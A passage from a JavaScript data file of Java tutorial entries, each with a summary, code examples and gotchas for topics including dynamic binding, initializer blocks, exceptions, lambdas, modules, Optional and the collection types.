      title: "Example 1: Dynamic binding (overriding)",
      description: "<p>The runtime type decides which method runs.</p>",
      code: "class Animal { String speak() { return \"...\"; } }\nclass Dog extends Animal { String speak() { return \"Woof\"; } }\nAnimal a = new Dog();\na.speak();   // \"Woof\" - chosen at RUNTIME by actual type (Dog)"
    },
    {
      title: "Example 2: Static binding (overloading/fields)",
      description: "<p>Declared type decides at compile time.</p>",
      code: "// Overloaded methods + fields use the DECLARED (compile-time) type:\nclass A { int x = 1; }\nclass B extends A { int x = 2; }\nA obj = new B();\nSystem.out.println(obj.x);  // 1 (fields are NOT polymorphic - static binding)"
    },
    {
      title: "Example 3: overridden methods use dynamic (late) binding",
      description: "<p>Instance method calls resolve to the object's runtime type - the basis of polymorphism.</p>",
      code: "class Shape { double area() { return 0; } }\n" +
        "class Circle extends Shape { double area() { return 3.14; } }\n" +
        "\n" +
        "Shape s = new Circle();\n" +
        "s.area(); // 3.14 - dynamically bound to Circle.area() at runtime"
    },
    {
      title: "Example 4 (edge case): fields and statics are bound statically",
      description: "<p>Only instance methods are dynamically dispatched - field access and static methods use the compile-time type, a frequent trap.</p>",
      code: "class A { int x = 1; static String tag() { return \"A\"; } }\n" +
        "class B extends A { int x = 2; static String tag() { return \"B\"; } }\n" +
        "\n" +
        "A ref = new B();\n" +
        "System.out.println(ref.x);     // 1 - fields are NOT polymorphic\n" +
        "System.out.println(ref.tag()); // \"A\" - statics resolve by declared type"
    }
  ],
  whenToUse: "<p>This is conceptual &mdash; understanding it explains Java's behavior. <strong>Gotchas:</strong> " +
    "the big surprise is that <strong>fields and static methods are NOT polymorphic</strong> (static binding " +
    "by declared type), while instance methods <em>are</em> (dynamic binding by actual type). So " +
    "<code>obj.x</code> uses the declared type but <code>obj.speak()</code> uses the runtime type. This is why " +
    "you should access overridable behavior through methods, not fields, and why hiding (not overriding) " +
    "static methods is confusing &mdash; avoid it.</p>"
};

C["initializer-block"] = {
  summary: "<p><strong>Initializer blocks</strong> are blocks of code that run during object/class setup. An " +
    "<strong>instance initializer</strong> <code>{ ... }</code> runs each time an object is created (before " +
    "the constructor body, after <code>super()</code>); a <strong>static initializer</strong> " +
    "<code>static { ... }</code> runs once when the class is loaded. They're used for complex field " +
    "initialization that can't be a simple assignment.</p>",
  examples: [
    {
      title: "Example 1: Static vs instance initializer",
      description: "<p>Class-load-once vs per-object.</p>",
      code: "class Config {\n  static Map<String,String> defaults;\n  static { defaults = loadDefaults(); }  // runs once, at class load\n\n  List<String> items;\n  { items = new ArrayList<>(); }          // runs for every new object\n}"
    },
    {
      title: "Example 2: Initialization order",
      description: "<p>Static first (once), then per-instance.</p>",
      code: "// Order on first use + each new:\n// 1. static fields + static blocks (once, in source order)\n// 2. for each new(): instance fields + instance blocks (in source order)\n// 3. then the constructor body"
    },
    {
      title: "Example 3: instance initializer blocks run before the constructor body",
      description: "<p>An instance <code>{ ... }</code> block runs on every construction, after <code>super()</code> and before the constructor body - useful for shared init across overloaded constructors.</p>",
      code: "class Widget {\n" +
        "  List<String> log = new ArrayList<>();\n" +
        "  { log.add(\"init\"); }      // instance initializer - runs for EVERY constructor\n" +
        "  Widget() { log.add(\"ctor\"); }\n" +
        "}\n" +
        "// new Widget().log -> [\"init\", \"ctor\"]"
    },
    {
      title: "Example 4 (edge case): an exception in a static initializer is fatal",
      description: "<p>If a static block throws, the class fails to initialize and you get an <code>ExceptionInInitializerError</code> - then <code>NoClassDefFoundError</code> on later use.</p>",
      code: "class Config {\n" +
        "  static final String URL;\n" +
        "  static { URL = System.getenv(\"URL\").trim(); } // NPE if URL unset\n" +
        "}\n" +
        "// First access throws ExceptionInInitializerError; the class is now\n" +
        "// permanently unusable in this JVM - subsequent uses throw NoClassDefFoundError."
    }
  ],
  whenToUse: "<p>Use static initializers for one-time, complex class-level setup (loading config, building " +
    "lookup tables). Instance initializers are rarely needed &mdash; usually constructors or field " +
    "initializers are clearer. <strong>Gotchas:</strong> initialization order can surprise you, and exceptions " +
    "in a static initializer cause <code>ExceptionInInitializerError</code> (class fails to load). Instance " +
    "initializers run for <em>every</em> constructor, which can duplicate logic &mdash; usually a constructor " +
    "or factory is more explicit. Prefer simple field initializers when possible.</p>"
};

C["pass-by-value-pass-by-reference"] = {
  summary: "<p>Java is <strong>always pass-by-value</strong>. For primitives, a copy of the value is passed. " +
    "For objects, a copy of the <em>reference</em> (the pointer) is passed &mdash; so the method can mutate " +
    "the object the reference points to, but reassigning the parameter doesn't affect the caller's variable. " +
    "This distinction trips up many developers who think Java is pass-by-reference for objects.</p>",
  examples: [
    {
      title: "Example 1: Primitives are copied",
      description: "<p>The caller's value is unchanged.</p>",
      code: "void increment(int n) { n++; }\nint x = 5;\nincrement(x);\nSystem.out.println(x);   // 5 (a COPY was modified)"
    },
    {
      title: "Example 2: Object references are copied (but point to the same object)",
      description: "<p>Mutation is visible; reassignment is not.</p>",
      code: "void mutate(List<String> l) { l.add(\"x\"); }     // affects caller's list\nvoid reassign(List<String> l) { l = new ArrayList<>(); } // does NOT\nList<String> list = new ArrayList<>();\nmutate(list);    list.size();  // 1 - mutation visible\nreassign(list);  list.size();  // still 1 - reassignment local only"
    },
    {
      title: "Example 3: reassigning a parameter doesn't affect the caller",
      description: "<p>Java passes the reference <em>by value</em>: the method gets a copy of the reference, so reassigning it is invisible outside.</p>",
      code: "static void swap(int[] a, int[] b) { int[] t = a; a = b; b = t; } // no effect\n" +
        "int[] x = {1}, y = {2};\n" +
        "swap(x, y);\n" +
        "System.out.println(x[0]); // still 1 - the local copies were swapped, not x/y"
    },
    {
      title: "Example 4 (edge case): you CAN mutate the pointed-to object",
      description: "<p>The copied reference still points at the same object, so mutating its contents is visible to the caller.</p>",
      code: "static void fill(int[] a) { a[0] = 99; } // mutates the shared array object\n" +
        "int[] x = {1};\n" +
        "fill(x);\n" +
        "System.out.println(x[0]); // 99 - same object, modified in place\n" +
        "// Distinction: reassign reference = local only; mutate object = shared."
    }
  ],
  whenToUse: "<p>Knowing this prevents real bugs. <strong>Gotchas:</strong> mutating an object passed to a " +
    "method <em>does</em> affect the caller (because both references point to the same object) &mdash; a " +
    "common source of surprising side effects, so prefer immutable objects or defensive copies for safety. " +
    "Reassigning a parameter never affects the caller. To 'return' multiple values, return an object/record " +
    "rather than mutating parameters. Strings and wrappers are immutable, so they always behave " +
    "value-like.</p>"
};

/* ===================== CORE LANGUAGE FEATURES ===================== */

C["exception-handling"] = {
  summary: "<p><strong>Exception handling</strong> manages errors via <code>try/catch/finally</code> and " +
    "<code>throw</code>/<code>throws</code>. Java distinguishes <strong>checked</strong> exceptions (must be " +
    "declared or caught &mdash; recoverable conditions like I/O) from <strong>unchecked</strong> " +
    "(<code>RuntimeException</code> &mdash; programming errors like null/illegal arguments) and " +
    "<strong>Errors</strong> (serious, don't catch). Proper handling keeps programs robust and failures " +
    "clear.</p>",
  examples: [
    {
      title: "Example 1: try/catch/finally + try-with-resources",
      description: "<p>Handle, clean up, and auto-close resources.</p>",
      code: "try (var in = new FileInputStream(\"f.txt\")) {  // auto-closed\n  // read...\n} catch (IOException e) {\n  log.error(\"read failed\", e);   // handle\n} finally {\n  // cleanup that always runs (rarely needed with try-with-resources)\n}"
    },
    {
      title: "Example 2: Throwing and custom exceptions",
      description: "<p>Signal errors with meaningful types.</p>",
      code: "class InsufficientFundsException extends RuntimeException {\n  InsufficientFundsException(String m) { super(m); }\n}\nvoid withdraw(double amt) {\n  if (amt > balance) throw new InsufficientFundsException(\"too much\");\n}"
    },
    {
      title: "Example 3: checked vs unchecked, and try-with-resources",
      description: "<p>Checked exceptions must be declared or caught; unchecked (RuntimeException) need not be. try-with-resources auto-closes and suppresses secondary exceptions.</p>",
      code: "// checked: compiler forces handling\n" +
        "void read() throws IOException { Files.readString(path); }\n" +
        "\n" +
        "// unchecked: no declaration needed\n" +
        "int parse(String s) { return Integer.parseInt(s); } // throws NumberFormatException\n" +
        "\n" +
        "try (var c = open()) { c.use(); } // c.close() runs even if use() throws"
    },
    {
      title: "Example 4 (edge case): swallowing exceptions and finally overriding returns",
      description: "<p>Two anti-patterns: catching and ignoring loses the failure; a <code>return</code> in <code>finally</code> silently discards exceptions and earlier returns.</p>",
      code: "try { risky(); } catch (Exception e) { } // SWALLOWED - bug becomes invisible\n" +
        "\n" +
        "int bad() {\n" +
        "  try { throw new RuntimeException(); }\n" +
        "  finally { return 1; } // hides the exception AND any try-block return!\n" +
        "}\n" +
        "// Always at least log e; never return/throw from finally."
    }
  ],
  whenToUse: "<p>Use exceptions for exceptional conditions, not normal control flow. <strong>Gotchas:</strong> " +
    "never swallow exceptions silently (empty <code>catch</code>) &mdash; at least log them. Catch specific " +
    "types, not bare <code>Exception</code>/<code>Throwable</code>. Don't catch <code>Error</code> " +
    "(<code>OutOfMemoryError</code> etc.). Preserve the cause when wrapping (<code>new X(msg, e)</code>) so " +
    "stack traces survive. Prefer try-with-resources over manual <code>finally</code> for closeables. " +
    "Checked-vs-unchecked is debated &mdash; many modern APIs favor unchecked. Fail fast with clear messages.</p>"
};

C["lambda-expressions"] = {
  summary: "<p><strong>Lambda expressions</strong> (Java 8+) are concise anonymous functions: " +
    "<code>(params) -> body</code>. They implement <strong>functional interfaces</strong> (interfaces with a " +
    "single abstract method) and let you pass behavior as data &mdash; enabling functional-style programming, " +
    "cleaner callbacks, and the Stream API. They replace verbose anonymous inner classes for single-method " +
    "implementations.</p>",
  examples: [
    {
      title: "Example 1: Lambda vs anonymous class",
      description: "<p>Far less boilerplate for a single-method impl.</p>",
      code: "// Old way:\nRunnable r1 = new Runnable() { public void run() { doIt(); } };\n// Lambda:\nRunnable r2 = () -> doIt();\nComparator<String> byLen = (a, b) -> a.length() - b.length();"
    },
    {
      title: "Example 2: Lambdas with collections/streams",
      description: "<p>Pass behavior into higher-order methods.</p>",
      code: "list.forEach(x -> System.out.println(x));\nlist.removeIf(x -> x.isEmpty());\nnames.stream().filter(n -> n.startsWith(\"A\")).forEach(System.out::println);"
    },
    {
      title: "Example 3: method references as lambda shorthand",
      description: "<p>When a lambda just calls an existing method, a method reference is cleaner.</p>",
      code: "List<String> names = List.of(\"sam\", \"jo\");\n" +
        "names.forEach(System.out::println);     // instance method ref\n" +
        "names.stream().map(String::toUpperCase); // unbound instance method ref\n" +
        "names.stream().map(String::new);         // constructor ref"
    },
    {
      title: "Example 4 (edge case): lambdas capture effectively-final variables only",
      description: "<p>A lambda can read enclosing locals but they must be (effectively) final - reassigning a captured variable won't compile.</p>",
      code: "int total = 0;\n" +
        "List.of(1, 2, 3).forEach(n -> total += n); // ERROR: total must be effectively final\n" +
        "\n" +
        "// Workarounds: a reduction, or an array/atomic holder:\n" +
        "int sum = List.of(1, 2, 3).stream().mapToInt(Integer::intValue).sum(); // 6"
    }
  ],
  whenToUse: "<p>Use lambdas for short, behavior-passing tasks: stream operations, callbacks, comparators, " +
    "event handlers. They make code more declarative. <strong>Gotchas:</strong> lambdas can only capture " +
    "<strong>effectively-final</strong> variables (can't reassign captured locals). They have no name " +
    "(harder stack traces) &mdash; for complex logic, extract a named method (and use a method reference " +
    "<code>System.out::println</code>). Don't cram large/multi-statement logic into a lambda; readability " +
    "suffers. <code>this</code> in a lambda refers to the enclosing instance (unlike anonymous classes).</p>"
};

C["annotations"] = {
  summary: "<p><strong>Annotations</strong> are metadata attached to code (classes, methods, fields, " +
    "parameters) with <code>@Name</code>. They don't change behavior by themselves but are read by the " +
    "compiler, tools, or frameworks at compile or runtime (via reflection) to drive behavior &mdash; e.g. " +
    "<code>@Override</code>, <code>@Deprecated</code>, and framework annotations like <code>@Entity</code>, " +
    "<code>@Autowired</code>, <code>@Test</code>.</p>",
  examples: [
    {
      title: "Example 1: Built-in annotations",
      description: "<p>Compiler-checked metadata.</p>",
      code: "@Override                       // compiler verifies it overrides\npublic String toString() { return \"...\"; }\n\n@Deprecated                     // warns users not to use this\nvoid oldMethod() {}\n\n@FunctionalInterface            // enforces single abstract method\ninterface Op { int apply(int x); }"
    },
    {
      title: "Example 2: A custom annotation",
      description: "<p>Define metadata read via reflection.</p>",
      code: "@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.METHOD)\n@interface Audited { String value(); }\n\nclass Service {\n  @Audited(\"transfer\") void transfer() {}\n}"
    },
    {
      title: "Example 3: a custom annotation with retention and target",
      description: "<p>Annotations need a retention policy (when they're visible) and optional target restriction; <code>RUNTIME</code> retention is required for reflection-based frameworks.</p>",
      code: "@Retention(RetentionPolicy.RUNTIME)  // visible via reflection at runtime\n" +
        "@Target(ElementType.METHOD)          // only allowed on methods\n" +
        "@interface Audited { String value() default \"\"; }\n" +
        "\n" +
        "class Service { @Audited(\"transfer\") void transfer() {} }"
    },
    {
      title: "Example 4 (edge case): SOURCE/CLASS retention isn't readable at runtime",
      description: "<p>A common mistake - an annotation without <code>RUNTIME</code> retention is invisible to reflection, so frameworks can't find it.</p>",
      code: "// Default retention is CLASS -> NOT available via reflection:\n" +
        "@interface Marker {}\n" +
        "\n" +
        "boolean has = obj.getClass().isAnnotationPresent(Marker.class); // always false!\n" +
        "// Add @Retention(RetentionPolicy.RUNTIME) for reflection to see it.\n" +
        "// @Override / @SuppressWarnings are SOURCE-only - used by the compiler, then gone."
    }
  ],
  whenToUse: "<p>You'll mostly <em>consume</em> annotations (Spring, JPA, JUnit, validation). Write custom ones " +
    "for cross-cutting metadata your tools/framework process. <strong>Gotchas:</strong> annotations alone do " +
    "nothing &mdash; something must <em>process</em> them (compiler, annotation processor, or runtime " +
    "reflection). Runtime-reflection annotations need <code>@Retention(RUNTIME)</code>. Don't over-annotate; " +
    "heavy reflection has performance/clarity costs. Always use <code>@Override</code> (catches errors) and " +
    "<code>@FunctionalInterface</code> for SAM interfaces.</p>"
};

C["modules"] = {
  summary: "<p>The Java <strong>Module System (JPMS, Java 9+)</strong> groups packages into " +
    "<strong>modules</strong> with explicit declarations (<code>module-info.java</code>) of what they " +
    "<code>exports</code> (make available) and <code>requires</code> (depend on). It provides stronger " +
    "encapsulation than packages (non-exported packages are truly hidden), reliable configuration (missing " +
    "dependencies fail at startup), and a smaller runtime footprint.</p>",
  examples: [
    {
      title: "Example 1: A module descriptor",
      description: "<p>Declare exports and dependencies.</p>",
      code: "// module-info.java\nmodule com.example.orders {\n  requires com.example.users;     // depends on this module\n  exports com.example.orders.api; // expose only this package\n  // internal packages stay truly hidden\n}"
    },
    {
      title: "Example 2: Strong encapsulation",
      description: "<p>Non-exported packages are inaccessible even via reflection.</p>",
      code: "// Only com.example.orders.api is usable by other modules.\n// com.example.orders.internal is hidden - can't be imported OR\n//   accessed by reflection (unless 'opens').\n// This is stronger than package-private visibility."
    },
    {
      title: "Example 3: exports vs requires in module-info.java",
      description: "<p>A module declares what it needs (<code>requires</code>) and what it exposes (<code>exports</code>); everything else is strongly encapsulated.</p>",
      code: "// module-info.java\n" +
        "module com.acme.app {\n" +
        "  requires com.acme.core;        // depend on another module\n" +
        "  requires transitive java.sql;  // re-export to my consumers\n" +
        "  exports com.acme.app.api;      // make ONLY this package public\n" +
        "}\n" +
        "// Packages not exported are invisible to other modules - even if public."
    },
    {
      title: "Example 4 (edge case): reflection needs 'opens', not 'exports'",
      description: "<p>Frameworks that reflect into your classes (Spring, Jackson) need <code>opens</code>; <code>exports</code> only grants compile-time access.</p>",
      code: "module com.acme.app {\n" +
        "  exports com.acme.model;             // compile-time access only\n" +
        "  opens com.acme.model to com.fasterxml.jackson.databind; // reflective access\n" +
        "}\n" +
        "// Without 'opens', Jackson throws InaccessibleObjectException at runtime."
    }
  ],
  whenToUse: "<p>Modules matter for large applications and libraries wanting strong encapsulation, explicit " +
    "dependencies, and custom slim runtimes (<code>jlink</code>). <strong>Gotchas:</strong> JPMS is " +
    "powerful but adds complexity and has a learning curve; many applications run fine on the classpath " +
    "without modularizing. Migrating a large codebase (and its dependencies, which may not be modularized) is " +
    "non-trivial. Reflection-heavy frameworks need <code>opens</code>. Adopt modules when their encapsulation/" +
    "packaging benefits are real; for typical apps the classpath is simpler.</p>"
};

C["optionals"] = {
  summary: "<p><strong><code>Optional&lt;T&gt;</code></strong> (Java 8+) is a container that may or may not " +
    "hold a value, used to represent 'possibly absent' results explicitly &mdash; making the possibility of " +
    "'no value' visible in the type and encouraging callers to handle it, reducing " +
    "<code>NullPointerException</code>s. You compose it with <code>map</code>, <code>filter</code>, " +
    "<code>orElse</code>, <code>ifPresent</code>.</p>",
  examples: [
    {
      title: "Example 1: Returning and handling Optional",
      description: "<p>Make absence explicit instead of returning null.</p>",
      code: "Optional<User> findUser(int id) { /* ... */ return Optional.empty(); }\n\nUser u = findUser(1).orElse(GUEST);              // default if absent\nfindUser(1).ifPresent(user -> notify(user));    // act if present\nString name = findUser(1).map(User::getName).orElse(\"unknown\");"
    },
    {
      title: "Example 2: Avoiding null chains",
      description: "<p>Compose safely without nested null checks.</p>",
      code: "// Instead of: if (u != null && u.getAddress() != null) ...\nString city = findUser(1)\n  .map(User::getAddress)\n  .map(Address::getCity)\n  .orElse(\"N/A\");"
    },
    {
      title: "Example 3: map/filter/orElseGet pipeline",
      description: "<p>Optional's functional methods express 'if present, transform' without explicit null checks.</p>",
      code: "String city = findUser(id)\n" +
        "    .map(User::address)\n" +
        "    .filter(a -> a.country().equals(\"NL\"))\n" +
        "    .map(Address::city)\n" +
        "    .orElseGet(() -> lookupDefaultCity()); // lazy default (not always computed)\n" +
        "// orElse(x) evaluates x eagerly; orElseGet(supplier) only if empty."
    },
    {
      title: "Example 4 (edge case): Optional anti-patterns",
      description: "<p>Don't use Optional for fields, parameters, or collections, and never call <code>get()</code> without checking - it defeats the purpose.</p>",
      code: "Optional<String> name = find();\n" +
        "name.get(); // throws NoSuchElementException if empty - same risk as null!\n" +
        "\n" +
        "// Avoid: fields like 'private Optional<X> x;' (serialization/memory cost),\n" +
        "// and 'Optional<List<T>>' - return an empty List instead.\n" +
        "name.ifPresent(System.out::println); // safe consumption"
    }
  ],
  whenToUse: "<p>Use <code>Optional</code> as a <strong>return type</strong> for methods that may not produce a " +
    "value (lookups, searches). <strong>Gotchas:</strong> don't use it for fields or method parameters (it's " +
    "not <code>Serializable</code> and adds overhead) &mdash; it's designed for return values. Never call " +
    "<code>get()</code> without checking (defeats the purpose; throws if empty) &mdash; use <code>orElse</code>/" +
    "<code>orElseThrow</code>/<code>ifPresent</code>. Don't wrap collections in Optional (return an empty " +
    "collection instead). It reduces NPEs but isn't a cure-all &mdash; data from outside still needs null " +
    "checks.</p>"
};

/* ===================== COLLECTIONS ===================== */

C["array-vs-arraylist"] = {
  summary: "<p>An <strong>array</strong> is fixed-size, can hold primitives, and uses <code>[]</code> syntax. " +
    "An <strong><code>ArrayList</code></strong> is a resizable, object-only list with rich methods " +
    "(<code>add</code>, <code>remove</code>, <code>size</code>) built on a backing array. Use arrays for " +
    "fixed-size/primitive/performance needs; use <code>ArrayList</code> for dynamic, convenient collections.</p>",
  examples: [
    {
      title: "Example 1: Fixed array vs dynamic list",
      description: "<p>Static size vs grow/shrink.</p>",
      code: "int[] arr = new int[3];          // fixed size 3, holds primitives\narr[0] = 1;\n\nList<Integer> list = new ArrayList<>();  // grows dynamically (objects)\nlist.add(1); list.add(2);\nlist.size();   // 2\nlist.remove(0);"
    },
    {
      title: "Example 2: When each wins",
      description: "<p>Performance/primitives vs flexibility.</p>",
      code: "// Array: int[] for performance-critical primitive data (no boxing)\n// ArrayList: when size is unknown/changes, or you need List methods\nList<String> names = new ArrayList<>(List.of(\"a\", \"b\"));"
    },
    {
      title: "Example 3: converting between array and list",
      description: "<p>Common interop - but the wrappers have sharp edges.</p>",
      code: "String[] arr = {\"a\", \"b\"};\n" +
        "List<String> view = Arrays.asList(arr); // FIXED-SIZE view, backed by arr\n" +
        "// view.add(\"c\");  // UnsupportedOperationException\n" +
        "List<String> real = new ArrayList<>(Arrays.asList(arr)); // resizable copy\n" +
        "\n" +
        "String[] back = real.toArray(new String[0]); // list -> array"
    },
    {
      title: "Example 4 (edge case): List.of is immutable; primitive arrays don't autobox",
      description: "<p><code>List.of</code> rejects mutation and nulls; and <code>Arrays.asList</code> on an <code>int[]</code> gives a single-element list of the array, not of ints.</p>",
      code: "List<Integer> xs = List.of(1, 2);\n" +
        "xs.add(3);                 // UnsupportedOperationException (immutable)\n" +
        "List.of(1, null);          // NullPointerException - nulls not allowed\n" +
        "\n" +
        "int[] nums = {1, 2, 3};\n" +
        "var bad = Arrays.asList(nums);   // List<int[]> of size 1, NOT List<Integer>!\n" +
        "var ok = Arrays.stream(nums).boxed().toList(); // [1, 2, 3]"
    }
  ],
  whenToUse: "<p>Default to <code>ArrayList</code> (or another <code>List</code>) for most app code &mdash; " +
    "flexibility and rich API outweigh raw array micro-performance. Use arrays for primitives (avoid boxing " +
    "overhead), fixed-size data, or hot loops. <strong>Gotchas:</strong> <code>ArrayList</code> boxes " +
    "primitives (<code>Integer</code> not <code>int</code>), costing memory/speed. <code>array.length</code> " +
    "(field) vs <code>list.size()</code> (method). Random access is O(1) for both; inserting/removing in the " +
    "middle of an <code>ArrayList</code> is O(n) (shifts elements) &mdash; use <code>LinkedList</code> or " +
    "different structure if that dominates.</p>"
};

C["set"] = {
  summary: "<p>A <strong><code>Set</code></strong> is a collection that holds <strong>no duplicate</strong> " +
    "elements. Main implementations: <code>HashSet</code> (fast, unordered), <code>LinkedHashSet</code> " +
    "(insertion order), and <code>TreeSet</code> (sorted). Sets are ideal for membership tests, " +
    "de-duplication, and mathematical set operations.</p>",
  examples: [
    {
      title: "Example 1: Uniqueness and membership",
      description: "<p>Duplicates are ignored; lookups are fast.</p>",
      code: "Set<String> tags = new HashSet<>();\ntags.add(\"java\");\ntags.add(\"java\");   // ignored - already present\ntags.size();         // 1\ntags.contains(\"java\");  // true (O(1) average)"
    },
    {
      title: "Example 2: Ordered and sorted sets",
      description: "<p>Choose by ordering needs.</p>",
      code: "Set<Integer> ins = new LinkedHashSet<>();  // keeps insertion order\nSet<Integer> sorted = new TreeSet<>();     // keeps sorted order\nsorted.add(3); sorted.add(1); sorted.add(2);\n// iterates 1, 2, 3"
    },
    {
      title: "Example 3: choosing the right Set implementation",
      description: "<p>HashSet (fast, unordered), LinkedHashSet (insertion order), TreeSet (sorted) trade speed for ordering.</p>",
      code: "Set<String> h = new HashSet<>();       // O(1), no order guarantee\n" +
        "Set<String> l = new LinkedHashSet<>(); // O(1), preserves insertion order\n" +
        "Set<String> t = new TreeSet<>();       // O(log n), sorted order\n" +
        "t.addAll(List.of(\"c\", \"a\", \"b\"));\n" +
        "System.out.println(t); // [a, b, c]"
    },
    {
      title: "Example 4 (edge case): HashSet relies on equals/hashCode",
      description: "<p>A mutable element changed after insertion, or a class without proper <code>equals</code>/<code>hashCode</code>, breaks set membership.</p>",
      code: "class P { int x; P(int x){this.x=x;} } // no equals/hashCode override\n" +
        "Set<P> s = new HashSet<>();\n" +
        "s.add(new P(1));\n" +
        "System.out.println(s.contains(new P(1))); // false! identity-based hashCode\n" +
        "// Fix: override equals+hashCode (or use a record). Also: never mutate a field\n" +
        "// used in hashCode while the object is in a HashSet - it becomes unfindable."
    }
  ],
  whenToUse: "<p>Use a <code>Set</code> when uniqueness matters or you need fast membership checks. " +
    "<code>HashSet</code> for general use, <code>LinkedHashSet</code> to preserve insertion order, " +
    "<code>TreeSet</code> for sorted iteration/range queries. <strong>Gotchas:</strong> hash-based sets " +
    "require correct <code>equals()</code>/<code>hashCode()</code> on elements &mdash; broken implementations " +
    "cause duplicates or lost elements. <code>HashSet</code> has no guaranteed order. <code>TreeSet</code> " +
    "needs elements to be <code>Comparable</code> (or a <code>Comparator</code>) and is O(log n). Don't add " +
    "mutable objects whose hashCode changes after insertion.</p>"
};

C["map"] = {
  summary: "<p>A <strong><code>Map</code></strong> stores <strong>key-value</strong> pairs with unique keys. " +
    "Implementations: <code>HashMap</code> (fast, unordered), <code>LinkedHashMap</code> (insertion/access " +
    "order), <code>TreeMap</code> (sorted by key), <code>ConcurrentHashMap</code> (thread-safe). Maps are one " +
    "of the most-used data structures &mdash; lookups, caches, counting, indexing.</p>",
  examples: [
    {
      title: "Example 1: Basic map operations",
      description: "<p>Put, get, and iterate key-value pairs.</p>",
      code: "Map<String, Integer> ages = new HashMap<>();\nages.put(\"Sam\", 30);\nages.get(\"Sam\");                 // 30\nages.getOrDefault(\"Jo\", 0);      // 0 (key absent)\nages.forEach((k, v) -> System.out.println(k + \"=\" + v));"
    },
    {
      title: "Example 2: Counting / merge / computeIfAbsent",
      description: "<p>Common idioms for aggregation.</p>",
      code: "Map<String, Integer> counts = new HashMap<>();\nfor (String w : words)\n  counts.merge(w, 1, Integer::sum);   // increment count\nMap<String, List<String>> groups = new HashMap<>();\ngroups.computeIfAbsent(\"a\", k -> new ArrayList<>()).add(\"x\");"
    },
    {
      title: "Example 3: the modern map idioms",
      description: "<p><code>computeIfAbsent</code>, <code>merge</code>, and <code>getOrDefault</code> replace verbose null-check patterns.</p>",
      code: "Map<String, List<String>> byCity = new HashMap<>();\n" +
        "byCity.computeIfAbsent(\"NYC\", k -> new ArrayList<>()).add(\"Sam\"); // group\n" +
        "\n" +
        "Map<String, Integer> counts = new HashMap<>();\n" +
        "for (String w : words) counts.merge(w, 1, Integer::sum);          // frequency count\n" +
        "\n" +
        "int n = counts.getOrDefault(\"missing\", 0);                       // safe lookup"
    },
    {
      title: "Example 4 (edge case): iteration order and the null-key rules differ",
      description: "<p>HashMap order is unspecified; TreeMap is sorted; and the implementations disagree on null keys/values.</p>",
      code: "Map<String,Integer> hm = new HashMap<>();  hm.put(null, 1); // allowed (one null key)\n" +
        "Map<String,Integer> tm = new TreeMap<>();  tm.put(null, 1); // NullPointerException\n" +
        "Map<String,Integer> cm = new java.util.concurrent.ConcurrentHashMap<>();\n" +
        "cm.put(null, 1); // NullPointerException - no nulls at all\n" +
        "// Never rely on HashMap iteration order; use LinkedHashMap/TreeMap if order matters."
    }
  ],
  whenToUse: "<p>Use maps for lookups by key, caches, counting, grouping, and associating data. Pick " +
    "<code>HashMap</code> by default, <code>TreeMap</code> for sorted keys, <code>LinkedHashMap</code> for " +
    "order (or LRU caches), <code>ConcurrentHashMap</code> for concurrency. <strong>Gotchas:</strong> keys " +
    "need correct <code>equals()</code>/<code>hashCode()</code>; mutable keys are dangerous. " +
    "<code>HashMap</code> isn't thread-safe (use <code>ConcurrentHashMap</code> under concurrency, not " +
    "<code>Collections.synchronizedMap</code> for performance). <code>get()</code> returns <code>null</code> " +
    "for missing keys (use <code>getOrDefault</code>). Learn <code>merge</code>/<code>compute*</code> &mdash; " +
    "they simplify common patterns.</p>"
};

C["queue"] = {
  summary: "<p>A <strong><code>Queue</code></strong> is a collection designed for holding elements before " +
    "processing, typically <strong>FIFO</strong> (first-in, first-out). Methods: <code>offer</code>/" +
    "<code>add</code> (enqueue), <code>poll</code>/<code>remove</code> (dequeue), <code>peek</code> (inspect " +
    "head). Implementations include <code>LinkedList</code>, <code>ArrayDeque</code>, and " +
    "<code>PriorityQueue</code> (ordered by priority).</p>",
  examples: [
    {
      title: "Example 1: FIFO queue",
      description: "<p>Add at the tail, remove from the head.</p>",
      code: "Queue<String> q = new LinkedList<>();\nq.offer(\"a\"); q.offer(\"b\");\nq.peek();    // \"a\" (head, not removed)\nq.poll();    // \"a\" (removed)\nq.poll();    // \"b\""
    },
    {
      title: "Example 2: PriorityQueue",
      description: "<p>Elements come out in priority order, not insertion order.</p>",
      code: "Queue<Integer> pq = new PriorityQueue<>();\npq.offer(3); pq.offer(1); pq.offer(2);\npq.poll();   // 1 (smallest first by default)\npq.poll();   // 2"
    },
    {
      title: "Example 3: PriorityQueue orders by priority, not insertion",
      description: "<p>A <code>PriorityQueue</code> always dequeues the smallest element per its comparator - the heart of Dijkstra, scheduling, top-K.</p>",
      code: "PriorityQueue<Integer> pq = new PriorityQueue<>(); // min-heap\n" +
        "pq.add(5); pq.add(1); pq.add(3);\n" +
        "pq.poll(); // 1 (smallest first, NOT insertion order)\n" +
        "\n" +
        "var maxHeap = new PriorityQueue<Integer>(Comparator.reverseOrder()); // largest first"
    },
    {
      title: "Example 4 (edge case): add/remove throw, offer/poll return signals",
      description: "<p>The two method families behave differently on a full/empty queue - mixing them up causes surprise exceptions.</p>",
      code: "Queue<Integer> q = new LinkedList<>();\n" +
        "q.poll();    // returns null when empty (no exception)\n" +
        "q.remove();  // throws NoSuchElementException when empty\n" +
        "\n" +
        "// On a bounded BlockingQueue: add() throws if full, offer() returns false.\n" +
        "// PriorityQueue is NOT thread-safe; use PriorityBlockingQueue for concurrency."
    }
  ],
  whenToUse: "<p>Use queues for task scheduling, buffering, BFS, producer-consumer patterns, and any " +
    "process-in-order workflow. <code>ArrayDeque</code> is the preferred general-purpose queue/stack (faster " +
    "than <code>LinkedList</code>). <code>PriorityQueue</code> for 'process most important first'. " +
    "<strong>Gotchas:</strong> prefer <code>offer</code>/<code>poll</code>/<code>peek</code> (return special " +
    "values) over <code>add</code>/<code>remove</code>/<code>element</code> (throw on empty/full). " +
    "<code>PriorityQueue</code> is not FIFO and its iterator order isn't sorted. For concurrent producer-" +
    "consumer, use <code>BlockingQueue</code> implementations (<code>java.util.concurrent</code>).</p>"
};

C["dequeue"] = {
  summary: "<p>A <strong><code>Deque</code></strong> ('double-ended queue', pronounced 'deck') allows adding " +
    "and removing elements from <strong>both ends</strong>. It can act as a FIFO queue <em>or</em> a LIFO " +
    "stack. The preferred implementation is <code>ArrayDeque</code> (fast, no capacity limits in normal use). " +
    "Methods come in <code>...First</code>/<code>...Last</code> pairs.</p>",
  examples: [
    {
      title: "Example 1: Add/remove from both ends",
      description: "<p>First/Last operations.</p>",
